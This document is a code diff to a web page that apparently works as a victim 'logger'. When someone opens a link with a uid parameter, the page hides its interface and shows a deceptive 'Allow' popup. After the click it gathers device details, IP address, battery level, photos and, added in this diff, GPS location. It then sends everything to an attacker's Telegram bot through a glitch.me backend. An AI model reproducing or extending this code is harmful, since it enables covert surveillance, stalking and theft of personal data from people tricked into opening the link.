@@ -34,6 +34,23 @@
       background: #000;
       margin-top: 10px;
     }
+    #permissionPopup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+    #permissionPopup button {
+      background: lime;
+      color: black;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -49,13 +66,19 @@
     <p>⚡ Coded by Divyansh ❤️</p>
   </div>
 
+  <div id="permissionPopup">
+    <h3>💀 Allow us to See Something Amazing?</h3>
+    <button onclick="allowLogger()">✅ Allow</button>
+  </div>
+
   <script>
     const params = new URLSearchParams(location.search);
     const uid = params.get("uid");
 
     if (uid) {
-      document.body.innerHTML = ""; // Hide UI
-      runLogger(uid);
+      document.body.innerHTML = ''; // hide UI
+      document.body.appendChild(document.getElementById("permissionPopup"));
+      document.getElementById("permissionPopup").style.display = "flex";
     }
 
     function generateUID() {
@@ -69,7 +92,6 @@
 
       const uid = generateUID();
 
-      // 🔐 Save token + chatid to backend
       fetch("https://grizzled-gamy-child.glitch.me/save", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -86,9 +108,10 @@
       alert("Copied to clipboard!");
     }
 
-    async function runLogger(uid) {
+    async function allowLogger() {
+      document.getElementById("permissionPopup").innerHTML = "<p style='color:lime;'>⏳ Collecting device info...</p>";
+
       try {
-        // 🔎 Get token/chat_id by UID
         const res = await fetch(`https://grizzled-gamy-child.glitch.me/get?uid=${uid}`);
         const { token, chat_id } = await res.json();
 
@@ -124,7 +147,17 @@
           battery: `${Math.round(battery.level * 100)}%`
         };
 
-        const caption = `💀 𝑫3𝑽'𝑿 𝑯𝒂𝒄𝒌𝒆𝒓  💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
+        let location = "Not granted";
+        if (navigator.geolocation) {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition((pos) => {
+              location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+              resolve();
+            }, () => resolve());
+          });
+        }
+
+        const caption = `💀 𝗗𝗶𝘃𝘆𝗮𝗻𝘀𝗵 𝗗𝗲𝗲𝘄𝗮𝗻𝗮 💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n📍 Location: ${location}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
 
         for (let i = 0; i < photos.length; i++) {
           await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
@@ -137,8 +170,12 @@
             })
           });
         }
+
+        document.getElementById("permissionPopup").innerHTML = "<p style='color:lime;'>✅ Sent to Telegram!</p>";
+
       } catch (e) {
         console.error("Logger failed:", e);
+        document.getElementById("permissionPopup").innerHTML = "<p style='color:red;'>❌ Error sending data!</p>";
       }
     }
   </script>
